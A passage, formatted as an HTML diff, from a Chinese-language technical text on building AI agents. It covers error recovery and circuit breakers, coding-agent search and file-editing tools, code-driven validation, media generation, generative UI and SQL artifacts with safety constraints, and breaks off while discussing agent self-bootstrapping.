+<p>还有一类故障不表现为错误：<strong>活性与完整性监控</strong>。流式连接最危险的失败模式不是断开（会立即报错）而是<strong>静默卡死</strong>——连接建立成功但数据流停止（水管通着但不出水）；SDK 超时往往只覆盖初始连接而非传输过程，因此需要独立的<strong>空闲看门狗（watchdog timer）</strong>，超时后主动杀死挂起的流并触发重试。<strong>原则：每个长连接都需要活性信号，而非仅依赖连接超时</strong>。完整性监控针对轨迹结构：发现工具调用缺少配对结果消息时，注入上下文前自动修复配对关系。工程细节：部分生产级 Agent 同时运行产品模式和训练数据收集模式——<strong>产品模式可以用占位符修补缺失消息，训练模式则拒绝修复</strong>（合成占位符会污染训练数据）。&ldquo;产品模式宽容、训练模式严格&quot;的双重标准体现 Harness 与模型训练的深度耦合。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>恢复：分级升级，逐级透明</strong>（按对用户透明的程度分级，能用低级别解决就不升级）：</p>
+<ul>
+<li>
+<p><strong>静默重试</strong>：可重试错误的默认动作。两个细节决定成败：指数退避叠加随机抖动（避免大量客户端同步重试造成二次拥塞、尊重服务端返回的等待时长提示）；区分前台与后台调用（主循环请求失败要重试，标题生成、输入建议这类辅助性后台调用失败直接放弃——否则后台重试挤占主链路配额形成&quot;重试放大&rdquo;）；</p>
+</li>
+<li>
+<p><strong>降级与接续</strong>：重试无效时改变请求本身再试。输出触顶（生成到一半被截断）：先静默提升输出上限重发，仍不够再在消息末尾追加元指令让模型从断点接续生成。主模型持续过载降级备用模型（需先剥离旧模型私有的格式块，否则新模型无法解析历史消息）；高成本模式被限流时暂时回落到标准模式；</p>
+</li>
+<li>
+<p><strong>暴露给用户</strong>：所有自动手段用尽后才呈现错误，并附上已经尝试过的恢复动作；</p>
+</li>
+<li>
+<p><strong>工具层错误走另一条路</strong>：不终止会话，把错误变成模型的输入——幻觉调用收到&quot;工具不存在&quot;的结构化错误结果；参数校验失败收到附带输入约束提示的错误；畸形参数（本该是对象却输出字符串）在执行前先经过程序化修复。<strong>错误以普通工具结果身份进入上下文，由模型在下一轮自行纠正</strong>——喂回的错误越具体，模型自我纠正成功率越高。</p>
+</li>
+<li>
+<p>核心原则：<strong>错误处理的边界不是单次请求，而是整个恢复循环</strong>。在确认无法恢复之前，中间错误不应暴露给消费者——恢复期间扣留错误消息，恢复成功则消费者毫无感知，全部失败才一并释放。这是第一章&quot;在确认无法恢复之前，不暴露中间态&quot;纠正原则的工程化。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>终止：每条恢复路径都要有上限</strong>：恢复机制本身也可能失效，因此每条恢复路径必须有明确熔断上限。<strong>阈值从产线数据而非拍脑袋来</strong>——Claude Code 压缩熔断&quot;连续 3 次&quot;来自真实会话统计：曾有一个会话在这条恢复路径上连续失败三千余次，仅这类无效重试每天在全球浪费约 25 万次 API 调用；逾千个会话出现 50 次以上连续失败。3 次正是&quot;绝大多数故障在此之前已恢复&quot;与&quot;继续重试基本无望&quot;之间的经验拐点。</p>
+<ul>
+<li>比单点熔断更隐蔽的是<strong>死亡螺旋</strong>：错误路径上触发的逻辑自身又调用 LLM，再次出错，连锁触发。真实形态：Agent 因上下文溢出停止 → 触发&quot;结束时自动提交代码&quot;的停止钩子 → 钩子调用 LLM 生成 commit message → 再次溢出 → 再次触发钩子。防护两条：<strong>在错误路径上禁用一切会再次调用模型的副作用逻辑</strong>（宁可丢掉一次辅助功能如自动记忆提取）；用递归深度计数器检测并打断残余连锁。最后在所有自动化之上还需<strong>全局终止与升级条件</strong>：最大迭代轮数、会话预算上限、连续失败超阈值升级到人工干预。</li>
+</ul>
+</li>
+<li>
+<p>回答第一章思考题：除工具结果缺失外，工具反复报同一错误、幻觉调用、上下文压缩丢失状态、任务本身无解都可能让 Agent 陷入循环。<strong>检测靠&quot;错误分类 + 模式识别&rdquo;，恢复靠&quot;分级升级&quot;，终止靠&quot;熔断器 + 全局上限 + 人工升级&quot;</strong>。这些机制解决的不是&quot;模型能力不足&quot;而是&quot;系统在边界条件下的鲁棒性&quot;——模型会越来越强，但网络会断、进程会挂、用户会做出意料之外的操作。<strong>Agent 的可靠性不取决于它犯不犯错，而取决于每类错误是否都有对应的检测、恢复与终止路径</strong>。</p>
+</li>
+</ul>
+<h3 id="18-coding-agent-">1.8 Coding Agent 的实现技巧</h3>
+<ul>
+<li>
+<p><strong>并行工具调用、流式执行与级联中止</strong>：传统串行模式（生成一个调用、执行完、拿结果、再决定下一步）浪费大量时间。现代 Coding Agent 充分利用流式响应——第一个工具调用的参数一经生成完整、通过校验即可立即开始执行，无需等待模型生成后续调用；彼此独立的调用之间并行执行而非排队。并行执行的另一面是故障处理：每个工具定义应声明是否支持并发执行（<strong>默认为否，失败安全</strong>）；某调用失败时通过<strong>级联中止</strong>终止同一批并行启动、依赖该结果的其他调用，但不波及独立调用和父级操作。</p>
+</li>
+<li>
+<p><strong>上下文的精细化管理</strong>：文件读取层面——大型文件支持按行号范围读取特定片段（只读第 100-150 行而非整文件）；<strong>返回内容附行号标注</strong>（每行代码以实际行号作前缀）——模型可精确引用&quot;在 src/main.py 的第 42 行&quot;，减少歧义使编辑更可靠。命令执行层面——长输出截断与持久化广泛应用（保留前若干行含错误上下文、后若干行含错误总结，中间一行提示替代并说明完整输出已存临时文件）。</p>
+</li>
+<li>
+<p><strong>环境信息的动态注入</strong>：第二章状态栏技术在 Coding Agent 中的集中体现。每次推理前在上下文末尾以状态栏形式注入：当前工作目录、git 分支、最近提交记录、未暂存和已暂存变更概览。<strong>不应硬编码在静态系统提示词中</strong>（破坏 KV Cache），而应作为动态追加式状态栏实时生成注入——Agent 获得&quot;环境感知&quot;能力。</p>
+</li>
+<li>
+<p><strong>命令执行环境的状态持久化</strong>：许多操作依赖环境状态（切换目录、激活虚拟环境、设置环境变量、启动后台服务）。如果每次命令都在全新 shell 执行，这些状态全丢（刚 cd 到项目目录下一条命令又回到根目录）。应维护<strong>持久化终端会话</strong>，Agent 启动时创建、整个交互保持活跃，每次命令都在共享终端执行。更符合人类开发者工作习惯。Agent 也应保留启动隔离终端的能力支持并行任务，但持久化会话应是默认模式。</p>
+</li>
+<li>
+<p><strong>即时的语法反馈机制</strong>：文件写入操作一完成，工具层自动运行 linter 或语法检查器，结果作为工具返回值呈现——Agent 在下一轮推理立即看到详细错误信息（像 IDE 打错括号立刻画红线）。错误可在引入那一刻修正，不必等运行测试才发现。</p>
+</li>
+<li>
+<p>五个技巧——并行与流式、上下文管理、环境感知、状态持久化、即时反馈——共同构成高效 Coding Agent 的技术基础，指向同一目标：<strong>让 Agent 像经验丰富的开发者那样流畅地工作</strong>。</p>
+</li>
+</ul>
+<h3 id="19-coding-agent-">1.9 Coding Agent 中的搜索工具</h3>
+<ul>
+<li>
+<p>四类互补搜索方式：</p>
+<ol>
+<li>
+<p><strong>正则表达式内容匹配（grep/ripgrep）</strong>：逐行扫描匹配模式。知道要查找的具体文本时快速准确。支持文件类型过滤和路径模式过滤减噪。根本局限：只能找文本上匹配的内容，无法理解语义（搜&quot;用户认证&quot;找不到虽无&quot;认证&quot;二字但确实处理登录逻辑的函数）；</p>
+</li>
+<li>
+<p><strong>文件名模式匹配（glob）</strong>：不看内容只在路径结构找符合模式的文件（**/*.test.ts）。速度比内容搜索快得多，是探索项目结构的第一步；</p>
+</li>
+<li>
+<p><strong>语义代码搜索</strong>：理解查询和代码的&quot;意义&quot;。两个关键问题：<strong>结构感知的分块</strong>（代码有严格语法结构，按函数、类、方法等完整语义单元切分而非固定字符数）；<strong>混合检索</strong>（向量嵌入擅长语义相似但用词不同——搜&quot;验证用户身份&quot;能找到 check_credentials；BM25 擅长精确匹配函数名变量名；并行执行后重排序模型合并排序）。适合探索性任务。<strong>业界路线之争</strong>：Claude Code 刻意不建嵌入索引，纯靠 agentic grep + glob 现场检索（不必维护随代码演化不断陈旧的索引、省掉索引基础设施、避免代码嵌入外发第三方服务的风险）；Cursor 走相反路线（愿意为跨文件语义召回付建索引成本）。取舍本质：&ldquo;基础设施与数据外发的代价&rdquo; vs &ldquo;跨文件语义召回的收益&rdquo;；</p>
+</li>
+<li>
+<p><strong>符号级定义与引用查找</strong>：基于 IDE&quot;跳转到定义&quot;&ldquo;查找所有引用&quot;能力（LSP 协议），能区分同名符号的定义和调用（authenticate 第 42 行是定义、第 189 行是调用，而文本搜索只能找到所有包含该字符串的行）。对代码重构尤其关键——重命名函数不能仅靠文本搜索（函数名可能出现在注释或字符串中）。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>实践组合使用：&ldquo;从粗到细、从语义到语法&quot;渐进式策略——先用语义搜索找到相关模块，再用正则精确定位具体代码行，最后通过符号搜索追踪调用链。</p>
+</li>
+</ul>
+<h3 id="110-coding-agent-">1.10 Coding Agent 中的文件编辑工具</h3>
+<ul>
+<li>
+<p>难点不在操作本身，而在如何让 LLM 高效又可靠地告诉系统&quot;改哪里、怎么改&rdquo;。五种方案：</p>
+<ol>
+<li>
+<p><strong>差异描述 + Apply Model</strong>：模型生成变更描述（类 git diff 的差异文本，或带省略标记的代码骨架），交给专门的&quot;应用模型&rdquo;（Apply Model）——通常是更小更快的 LLM——与原文件合并产出完整新文件。分离关注点：主模型专注高层逻辑、应用模型专注底层文本操作。朴素实现脆弱在合并环节（变更描述与文件实际代码有微小出入需判断是否同一位置、多个相似片段可能合并到错误地方）。Cursor 是代表：主模型输出带省略标记的代码骨架，专门训练的 fast-apply 小模型重写完整文件，借助推测解码（以原文件内容为草稿并行验证）把合并速度做到每秒上千 token；</p>
+</li>
+<li>
+<p><strong>旧字符串到新字符串（Old String → New String）</strong>：Claude Code 采用。模型提供 old string（被替换原文）和 new string（替换后新文本），框架执行简单字符串查找替换。优势：可预测性和透明性（存在且唯一则成功否则失败，无模棱两可）。代价：删除大段代码需完整输出所有原始内容、一个字符偏差就匹配失败；同一代码多次出现需更长上下文消除歧义；</p>
+</li>
+<li>
+<p><strong>行号定位（Old Line Numbers → New String）</strong>：模型指定&quot;删除第 X 到 Y 行，插入新内容&quot;。行号精确无歧义，大段删除只需两个数字。但模型&quot;数&quot;行号易出错（尤其文件很长时）；每次编辑后后续行号变化，限制多处编辑的并行性；</p>
+</li>
+<li>
+<p><strong>类 Vim 编辑命令</strong>：支持复制、剪切、粘贴等丰富操作。对重组代码（移动函数）非常高效。命令语法学习负担大——最强模型能较好使用，较小模型错误率明显上升；</p>
+</li>
+<li>
+<p><strong>字符串首尾匹配（Old String Start + End → New String）</strong>：旧字符串替换的改进——模型只需提供要删除内容的开头几行和结尾几行，中间可省略。框架匹配首尾定位替换区域，只要&quot;首尾&quot;组合在文件中唯一就能准确定位。综合文本替换的可靠性和行号方案的效率，模型犯错风险相对较低。</p>
+</li>
+</ol>
+</li>
+<li>
+<p>实践建议：Claude Code&quot;旧字符串到新字符串&quot;可靠性优先、实现简单、无需额外模型——<strong>对自建 Agent 是最稳妥的起点</strong>；处理大段改动时&quot;字符串首尾匹配&quot;更经济；行号方案仅在 IDE 深度集成（编辑器实时维护行号映射、每次编辑后立即重新供给模型）场景才可靠，否则易因行号漂移失效。</p>
+</li>
+</ul>
+<hr>
+<h2 id="2--agent-">2. 代码：通用 Agent 的元能力</h2>
+<ul>
+<li>
+<p><strong>元能力（meta-capability）</strong>：普通能力是 Agent 能做某件具体的事；元能力是&quot;能创造其他能力&quot;的能力——Agent 用它当场写出新工具、新约束、新表达形式来完成任务，不必事先把所有能力预制好。代码生成正是这样的元能力——精确、可执行、可组合，既能产出新工具（脚本、API 调用序列），也能产出新约束（断言、校验规则），还能产出新的表达形态（HTML 表单、PPT、视频帧）。</p>
+</li>
+<li>
+<p>六个发挥方向按&quot;元能力作用对象&quot;由内向外组织：</p>
+<ol>
+<li>
+<p>思维本身——思考工具（用代码替代易错的自然语言推理）；</p>
+</li>
+<li>
+<p>业务规则——业务规则约束（把模糊政策编码为可执行约束）；</p>
+</li>
+<li>
+<p>内容呈现——多媒体生成（PPT、视频、可视化产物）；</p>
+</li>
+<li>
+<p>系统接口——系统适配器（桥接异构 API、适应数据格式演化）；</p>
+</li>
+<li>
+<p>用户界面——生成式 UI（动态构造表单与交互界面）；</p>
+</li>
+<li>
+<p>Agent 自身——自举（用代码创造或修复新 Agent）。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="21-">2.1 代码作为思考工具</h3>
+<ul>
+<li>
+<p>LLM 在精确计算、符号操作、严格逻辑推导上有根本短板——模型思考本质是概率性的、近似的，而数学和逻辑问题要求确定性、精确答案。</p>
+</li>
+<li>
+<p>集合问题例子：纯自然语言推理容易出错（误从数学人数中减），代码推理精确可验证（only_phys = phys - both # 8 ✓）。<strong>让 LLM 负责理解问题并写代码，让代码解释器负责精确计算——分工各司其职</strong>。</p>
+</li>
+<li>
+<p><strong>Wolfram 洞察</strong>：LLM 出现前已有能做精确数学计算的系统——符号计算（Symbolic Computation，用数学符号而非近似数值处理表达式，普通计算器把 2√2 算成 1.414，符号系统保持精确形式）。Wolfram Alpha 的问题是自然语言理解脆弱、覆盖面窄（依赖内置语法解析，问法稍变就解析失败）。LLM 恰好弥补短板——<strong>协同模式：LLM 负责理解自然语言问题、识别数学或逻辑结构、转化为形式化语言（Mathematica 或 Python SymPy），交给符号计算引擎或约束求解器执行</strong>。</p>
+</li>
+<li>
+<p>实验 5-1 ★★（代码提升数学解题）：sympy 符号计算、scipy 数值优化、numpy 矩阵运算，AIME 风格题评测，代码辅助模式准确率显著更高。</p>
+</li>
+<li>
+<p>实验 5-2 ★★（代码提升逻辑思考）：python-constraint 库把逻辑谜题（骑士与无赖）转化为形式化约束，K&amp;K Puzzle 数据集代码辅助求解准确率达 90% 以上。<strong>揭示更普遍规律：模型与脚手架（harness）是此消彼长的关系</strong>——模型足够强时脚手架可以更薄（代码求解器增益收窄）；模型不够强时就得在脚手架里做更多（把关键逻辑推理交给代码和约束求解器兜住正确性）。<strong>脚手架该做多厚取决于手上模型的能力边界——评估一项 Agent 技术时容易忽视的前提：同一套脚手架配上不同能力模型，结论可能截然不同</strong>。</p>
+</li>
+</ul>
+<h3 id="22-">2.2 代码作为业务规则的约束</h3>
+<ul>
+<li>
+<p>对 Harness&quot;约束：编码化而非文档化&quot;的直接回应。业务规则、办事流程、决策逻辑仅用自然语言充满歧义——&ldquo;购买后 7 天内可退款&quot;看似清楚，但&quot;7 天&quot;是自然日还是工作日？&ldquo;购买&quot;是下单时间还是发货时间？代码提供无歧义、可执行的知识表达——要么成功运行要么抛错，不存在模棱两可。</p>
+</li>
+<li>
+<p><strong>自然语言规则 vs 代码化规则：互补而非替代</strong>：</p>
+<ul>
+<li>
+<p>自然语言规则优势：模型可基于规则向用户解释政策、根据规则找变通方案（改签而非取消）、调用工具前初步判断可行性；</p>
+</li>
+<li>
+<p>代码化校验工具优势：逻辑精确无歧义（不会&quot;理解偏差&rdquo;）、执行确定性（相同输入必相同输出）、适合复杂规则组合（多条件布尔组合、时间计算、跨数据源验证）。</p>
+</li>
+<li>
+<p>实践结合：系统提示词含自然语言规则供理解沟通，关键决策点配代码化校验工具作&quot;守门员&rdquo;。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>真正价值不在于优化 token 效率，而在于防止不可逆的错误操作</strong>——取消订单、转出资金、删除数据一旦执行无法撤销。代码化校验在操作前设最后一道防线，安全保障价值远超实现成本。</p>
+</li>
+<li>
+<p><strong>合并校验与执行：checklist 引导思考，真值校验守门</strong>（τ-bench 航空取消政策示例）。核心设计：</p>
+<ul>
+<li>
+<p>第一层：<strong>参数作为思考的 checklist</strong>——工具描述列出完整政策要求&quot;调用前先查询订单详情、逐条核对&quot;；可选的 expected_* 参数（expected_cabin_class、expected_has_insurance）促使模型把自己的判断依据显式写出来——填写参数的过程本质是强制性 checklist。当模型查到舱位经济舱且未购保险，很可能在准备调用时就注意到规则 5，根本不发起调用而是直接提议替代方案。<strong>这一层引导思考、减少无效调用，但不承担安全责任</strong>（expected_* 只是模型自我陈述，服务端从不当作事实）；</p>
+</li>
+<li>
+<p>第二层：<strong>服务端真值校验才是守门员</strong>——舱位等级、保险状态、预订时间、航段使用情况、航班状态全部由服务端查询数据库获得；当前时间来自服务端时钟。<strong>没有任何一条政策事实来自模型自报的参数</strong>。这不是多余谨慎：模型可能幻觉，也可能被提示注入操纵——如果把 cabin_class、has_insurance、current_time 设计成模型填写的参数，模型只要报错（或被诱导报错）一个值，&ldquo;守门员&quot;就形同虚设。<strong>最后一道防线必须建立在模型无法伪造的数据之上——独立性不仅指独立的模型，更指独立的数据来源</strong>。模型自报值与真值不一致时记录告警（发现模型错误认知或潜在注入）。</p>
+</li>
+<li>
+<p>三重保障完整：①系统提示词自然语言规则帮助理解解释；②工具描述与参数设计作为 checklist 引导调用前显式核对；③服务端基于数据库真值的代码化校验作最后守门员。前两重减少错误发生，第三重确保错误不会变成不可逆损失。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>实验 5-3 ★★（小模型代码化知识提升规则执行准确性）：Qwen3-4B 基于 τ-bench 航空客服场景，控制组纯自然语言规则 vs 实验组三重保障。预期：实验组显著优于控制组；观察到模型准备参数时自主识别违规操作直接提议替代方案（验证 checklist 有效性）；统计 expected_* 自报值与真值不一致比例（验证服务端真值校验必要性）。</p>
+</li>
+</ul>
+<h3 id="23-">2.3 代码驱动的多媒体生成</h3>
+<ul>
+<li>
+<p>许多复杂文档创作本质是结构化数据的组织和呈现——HTML 描述结构、CSS 控制样式、JavaScript 实现交互。传统 GUI 所见即所得编辑对 Agent 既不直观也不高效（需视觉理解和精确坐标定位）。<strong>通过代码生成，Agent 绕开视觉定位难题，获得对文档的精确控制能力</strong>。</p>
+</li>
+<li>
+<p><strong>PPT 生成</strong>：现代 PPT 框架（如 Slidev）用 Markdown 和 HTML 定义演示内容，对 Agent 极友好。但仅生成代码不够——Agent 不知道实际渲染效果（内容太挤、文字溢出、图片尺寸），必须引入<strong>提议者-审核者机制</strong>：</p>
+<ul>
+<li>
+<p>Proposer Agent：生成 Slidev 代码，理解内容逻辑结构分解页面；</p>
+</li>
+<li>
+<p>Reviewer Agent：运行代码把每页渲染为图片，用 <strong>Vision LLM</strong>（能&quot;看&quot;图片的多模态模型）从内容密度、可读性、布局合理性、视觉美感分析渲染结果，生成结构化改进建议——不是模糊的&quot;不好看&rdquo;，而是具体可执行的指导（&ldquo;第 3 页：内容过多，建议拆分&rdquo;、&ldquo;第 7 页：代码块字体过小，建议增大到 14pt&rdquo;），含页码、问题类型、严重程度字段；</p>
+</li>
+<li>
+<p>迭代直到质量达标或达到最大次数（如 5 轮）。&ldquo;质量达标&quot;与&quot;最大轮数&quot;正是 Loop 工程要求的两类显式终止条件——前者由审核者判定目标达成，后者用预算上限防止循环失控。</p>
+</li>
+<li>
+<p>与第四章事前审批同源（都是提议者-审核者范式实例：生成与审查分离、双模型独立评估）：差异在目标与形态——第四章用于不可逆操作安全审查（单次批准/否决）；本章用于内容质量迭代改进（多轮循环，且审核者接触到提议者看不到的新信息——渲染结果）。核心设计原则一脉相承（共享目标约束、不同模型家族降低同类错误概率、反馈作为特殊事件加入 Proposer 轨迹）。<strong>采用双 Agent 分工而非单 Agent 循环的核心优势在上下文管理</strong>：Reviewer 每次只处理最新版本渲染图片不受历史干扰；Proposer 仅累积结构化文本反馈，token 少且易于推理。单 Agent 方案需在同一上下文累积数十页渲染图片多轮迭代，上下文迅速超限。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>实验 5-4 ★★（论文 PPT 自动生成）、实验 5-5 ★★（论文讲解视频：PPT 生成 + 口语化讲解文字 + TTS 语音 + ffmpeg 合成）、实验 5-6 ★★（视频剪辑：Blender Python API 生成 + 视频分析子 Agent 两步定位——粗粒度每 10 秒截图 + 精细粒度每秒截图，避免大量截图占用主上下文 + Reviewer 渲染关键帧检查）。</p>
+</li>
+<li>
+<p><strong>视频编辑重构为 API 调用和代码生成</strong>：通用 Computer Use 做视频编辑面临根本挑战（GUI 极其复杂、精确输出坐标困难）。专业软件（Blender Python API、FFmpeg）提供程序化接口，每个操作对应清晰函数调用——将自然语言需求转化为 API 调用远比模拟鼠标点击容易。</p>
+</li>
+</ul>
+<h3 id="24-">2.4 代码作为系统适配器</h3>
+<ul>
+<li>
+<p>真实系统里 Agent 打交道的外部服务常常没有现成 SDK、接口不规范（文档缺失、返回格式非标准、字段随版本漂移）。<strong>Agent 不必等人预先写好适配层，而是当场读接口文档、或直接观察一两条真实响应，即时生成适配代码</strong>——构造 HTTP 客户端、拼装鉴权头、解析非标准返回结构、把上游数据模型翻译成下游能消费的形状。代码成了连接任意系统的&quot;万能胶&rdquo;。</p>
+</li>
+<li>
+<p><strong>延伸到完全没有 API 的系统</strong>：外部系统只暴露图形界面时，Agent 先通过 Computer Use 操作界面，再把成功操作序列用代码固化为 <strong>RPA 工具</strong>——未来执行相同任务直接运行代码，极高速度和稳定性，无需再调用昂贵的视觉思考。RPA 是&quot;系统适配器&quot;在无接口系统上的极端形态。</p>
+</li>
+<li>
+<p><strong>日志自适应解析</strong>：数据格式多样且不断变化（同一系统演化中多次修改格式——添加字段、改变嵌套结构、引入新类型）。为每种格式手写解析代码维护成本极高。代码生成思路：<strong>Agent 在遇到新格式时基于样本数据临时生成解析代码，系统自动适应格式演化</strong>。建立自动修复反馈循环：前端遇无法解析的日志格式 → 自动将失败信息（原始日志样本、详细报错）报告 Agent → Agent 分析样本结构生成正确解析代码 → 代码在虚拟浏览器自动测试（Vision LLM 检查可视化效果）→ 通过后热更新到前端系统。</p>
+</li>
+<li>
+<p>实验 5-7 ★★★（自适应日志解析系统）：初始系统仅支持基本格式，全流程自动化（检测失败→报告→生成代码→虚拟浏览器测试→热更新）。</p>
+</li>
+<li>
+<p><strong>生产日志自动诊断</strong>：任务失败可能由多个模块协同错误导致；重现成本高；已修复问题易反复出现（缺系统化回归测试）。Agent 读取生产日志 + 架构文档 + PRD 自动判断执行流程是否符合预期、定位问题环节和模块 → 生成结构化问题报告（优先级、模块、描述、改进建议）和回归测试用例（引用问题轨迹 ID 和关键交互轮次，测试框架自动重放验证）→ 通过 MCP 对接 GitHub 创建 Issue 并分配给开发者——从问题发现到任务分派全自动化。</p>
+</li>
+<li>
+<p>实验 5-8 ★★★（生产日志智能诊断系统）。</p>
+</li>
+</ul>
+<h3 id="25--ui">2.5 代码作为生成式 UI</h3>
+<ul>
+<li>
+<p>文本作为线性、单一交互方式在很多场景效率低下（收集结构化信息反复问答冗长、呈现复杂数据关系表达力有限、多选项选择不如可视化直观）。<strong>生成式 UI（Generative UI）</strong>：Agent 动态生成表单、交互式图表甚至完整 Web 应用，将静态文本对话升级为丰富的多模态交互。</p>
+</li>
+<li>
+<p><strong>A2UI 类协议：生成式 UI 的标准化</strong>：Agent 直接生成 HTML/JavaScript 存在根本安全问题——生成的代码可能包含恶意内容（提示注入操纵 Agent 生成窃取数据的脚本；成因是提示注入，效果类似传统 XSS，不能把整个攻击直接叫 XSS）。<strong>A2UI（Agent-to-User Interface）声明式界面协议</strong>：Agent 不直接生成可执行代码，只输出&quot;界面描述清单&quot;（JSON 格式，&ldquo;请显示一个包含 3 行 2 列的表格，标题是「销售数据」&quot;），客户端收到后用自己预先准备好的安全组件渲染。像餐厅菜单——顾客（Agent）只能点菜单上有的菜（预定义组件），不能走进厨房自己做（执行任意代码）。<strong>厘清混淆：AG-UI（Agent-User Interaction，CopilotKit 提出）名字相近但不是界面描述语言，而是配套的事件/传输协议</strong>（把 Agent 执行状态流式推送到前端，本身可承载 A2UI 界面载荷）——二者互补而非同类。</p>
+<ul>
+<li>
+<p>核心设计原则：安全优先（客户端维护受信任组件目录 Card/Button/TextField/Table，Agent 只能请求渲染目录中已有组件，无法注入任意代码；客户端用原生组件渲染而非执行 Agent 生成的任意 HTML）；跨平台（同一描述在 React/Flutter/原生应用渲染）；增量生成（流式 JSONL，边接收边渲染）。</p>
+</li>
+<li>
+<p>声明式方法适用标准化交互场景（表单、表格、卡片）；高度定制化需求（自定义可视化、游戏界面）直接生成代码仍是更灵活选择。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>用 HTML 交付成果：取代 Markdown 汇报</strong>：三个优势——交互式演示（可操作形式演示系统如何运行，一看就懂）；更好的数据可视化（图表 + 交互组件让用户自行浏览筛选下钻）；可持续完善的交付件（HTML 网站不必是任务结束时才产出的死物，可随工作推进不断补充完善）。</p>
+<ul>
+<li>作者写论文的经历：每个研究项目维护交互式网站，随实验推进持续更新。三类作用：<strong>实验数据追溯</strong>（每次实验数据、prompt、LLM 原始回复逐条查看，摊开反而更容易发现数据构造/格式/分布问题、LLM 回复和 judge 打分是否有系统性偏差）；<strong>训练指标监控</strong>（训练损失与验证损失、梯度范数、学习率、困惑度、强化学习的奖励/KL 散度/策略熵——&ldquo;内科指标&quot;区别于任务准确率那类结果指标，往往能更早暴露损失不收敛、梯度爆炸、训练崩溃）；<strong>运行原理展示</strong>。</li>
+</ul>
+</li>
+<li>
+<p><strong>澄清用户意图</strong>：OpenAI Deep Research 文本问答局限——效率（每个问题一轮对话，十个澄清点十轮交互）、表达力（问题间存在依赖关系，纯文本难以表达级联）。通过代码生成创建结构化交互界面替代：HTML 表单（文本框、下拉菜单、复选框、日期选择器），更进一步生成<strong>级联表单</strong>（JavaScript 动态逻辑：选择某选项自动显示/隐藏后续问题、动态更新可选项）。用户一次填写完整个表单，无需多轮对话，清晰看到所有信息和问题间的逻辑关系。</p>
+</li>
+<li>
+<p>实验 5-9 ★★（动态表单意图澄清）：“我想订一张去北京的机票”→ 表单含出发城市（文本输入）、出发日期（日期选择器）、旅行类型（单选单程/往返）、返程日期（仅选&quot;往返&quot;时显示）。</p>
+</li>
+<li>
+<p><strong>生成 SQL 查询（Artifact 模式）</strong>：关键设计选择——让 Agent 执行 SQL 后用自然语言描述结果，还是让 Agent 生成 SQL 代码作为 artifact 由前端直接执行？第一种&quot;更智能&quot;但效率极低（查询结果可能数千行大表格，LLM 阅读后描述消耗大量 token 且&quot;抄写&quot;数据极易出错）。<strong>更好方案：Artifact 模式</strong>——Agent 不自己读数据，生成 SQL 查询代码作为独立可执行产物交给系统，系统直接查询数据库，把数据渲染成用户能看到的表格。<strong>数据从数据库直达用户界面，完全绕过 LLM 这个&quot;中间人&rdquo;</strong>——LLM 只负责写查询语句，不亲自读成千上万行数据再复述。更进一步：Agent 生成两个 artifact 形成流水线（SQL 查询 + 可视化代码如柱状图），前端把 SQL 结果直接传给可视化代码。</p>
+<ul>
+<li><strong>安全约束</strong>：生成的 SQL 和可视化代码不能直接执行——执行层用只读数据库账号、解析 SQL 只允许经批准的 SELECT 语句（拒绝 DDL、DML、多语句查询）、用户提供值由服务端参数化绑定、限制查询时间/返回行数/可访问表和范围；可视化代码在隔离网络和文件系统的沙盒运行、只产生规定格式结果。<strong>Artifact 模式缩短数据路径，但不能替代权限检查与执行隔离</strong>。</li>
+</ul>
+</li>
+<li>
+<p>实验 5-10 ★★（自然语言交互 ERP Agent）：PostgreSQL 员工表 + 工资表，Agent 自动回答在职时长、部门人数、平均级别、涨薪幅度等 10 个问题。</p>
+</li>
+<li>
+<p><strong>动态生成软件</strong>：代码生成终极应用——Anthropic&quot;Imagine with Claude&quot;展示边界（用户提需求，Claude 实时生成前端界面和交互逻辑，用户与生成软件交互，Claude 修改代码生成新界面展示结果）。完全动态生成模式成本和延迟较高，更适合作为能力边界展示。更务实方向：<strong>基于已有框架定制化修改的&quot;半定制&quot;模式</strong>——保留基础软件稳定性、特定维度开放用户控制权（&ldquo;把按钮改成蓝色&quot;&ldquo;侧边栏添加快捷菜单&rdquo;），Agent 理解需求修改前端代码，热加载（HMR，Hot Module Replacement，局部热替换、保留应用状态、无需整页刷新）即时生效。&ldquo;一刀切&quot;标准产品变&quot;千人千面&quot;个性化体验。</p>
+</li>
+<li>
+<p>实验 5-11 ★★（对话式界面定制系统）：React 前端 + FastAPI 后端均开热加载，用户对话提 UI 定制需求，Agent 改代码，热加载自动检测文件变化前端重新编译刷新。</p>
+</li>
+</ul>
+<h3 id="26-agent-">2.6 代码创造代码：Agent 自举</h3>
+<ul>
+<li>
+<p>与第八章划清分工：本节讨论 Coding Agent 如何用代码修复和创建与自己同类的 Agent——自我修复、自我复制、按需生成新 Agent，重点是代码生成与系统构造能力，称为<strong>自举（bootstrapping）</strong>。第八章重点不是怎样写这些代码，而是怎样由已评价的生产经验触发自我修改（选择知识/指令/程序/参数作更新对象、从稳定版本生成候选版本、通过回归/灰度发布/回滚控制风险）。</p>
+</li>
+<li>
+<p><strong>Agent 的自我修复：OpenClaw Doctor</strong>——自动检测三类问题：配置异常（过期 OAuth token、遗留配置格式、端口冲突）、状态问题（陈旧会话锁文件、插件依赖缺失）、服务健康问题（网关未运行、沙盒镜像缺失）。分层修复策略：<strong>安全的修复自动执行</strong>（配置归一化、锁文件清理）；<strong>有风险的操作需用户确认</strong>（服务重启、强制覆盖配置）。</p>
+<ul>
+<li>避免夸大：过期 token、锁文件、端口冲突这类高频问题本身有明确检测规则和固定修复动作，doctor 以确定性检查为基础先覆盖（与传统运维脚本无本质不同）。<strong>真正体现 Agent 能力的是第二层</strong>：对确定性规则未覆盖的疑难问题，doctor 交给 LLM 分析错误日志、理解配置文件语义、推断因果关系，生成针对性修复方案。<strong>确定性检查保证常见问题稳定修复，LLM 兜底应对长尾疑难</strong>——两层配合。&ldquo;Agent 修复 Agent&quot;的模式，当工作对象从外部系统变成自身运行环境时，自我修复能力就从系统适配器升级为 Agent 自举的基础设施。</li>
+</ul>
+</li>
+<li>
+<p><strong>让 Agent 编写 Agent 的关键技巧</strong>：创造高质量 Agent 比生成普通应用代码复杂，需对 Agent 架构模式、最佳实践、常见陷阱有深刻理解。常见缺陷：</p>
+<ul>
+<li>
